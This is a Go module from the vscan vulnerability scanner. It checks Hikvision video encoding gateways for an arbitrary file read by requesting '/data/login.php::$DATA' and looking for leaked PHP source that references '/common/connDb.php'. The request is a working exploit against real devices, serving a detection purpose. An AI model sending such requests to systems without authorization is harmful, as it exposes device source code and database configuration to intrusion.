package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//HIKVISION 视频编码设备接入网关 $DATA 任意文件读取

func DATA(u string) bool {
	if req, err := pkg.HttpRequset(u+"/data/login.php::$DATA", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "/common/connDb.php") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln HIKVISION 视频编码设备接入网关 $DATA 任意文件读取 |%s\n", u+"/data/login.php::$DATA"))
			return true
		}
	}
	return false
}
